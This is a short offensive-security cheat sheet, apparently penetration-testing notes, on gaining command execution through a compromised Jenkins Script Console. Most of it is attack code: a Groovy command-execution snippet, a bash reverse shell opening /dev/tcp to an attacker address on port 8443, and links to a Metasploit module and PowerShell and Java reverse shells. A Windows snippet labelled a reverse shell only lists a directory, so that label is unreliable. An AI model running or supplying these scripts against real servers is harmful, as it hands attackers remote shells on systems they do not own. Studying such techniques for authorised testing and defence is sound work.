


#### Script Console

Once we have gained access to a Jenkins application, a quick way of achieving command execution on the underlying server is via the [Script Console](https://www.jenkins.io/doc/book/managing/script-console/). The script console allows us to run arbitrary Groovy scripts within the Jenkins controller runtime.

Groovy source code gets compiled into Java Bytecode and can run on any platform that has JRE installed.


1. groovy webshell script
```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```
2. alternate revshell script (need to open listener on attack host)
```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
3. [Metasploit Module](https://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console/)
4. Against a Windows host, we could attempt to add a user and connect to the host via RDP or WinRM or, to avoid making a change to the system, use a PowerShell download cradle with [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1).
5. Windows based revshell
```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```
6. [Java Rev Shell](https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy)



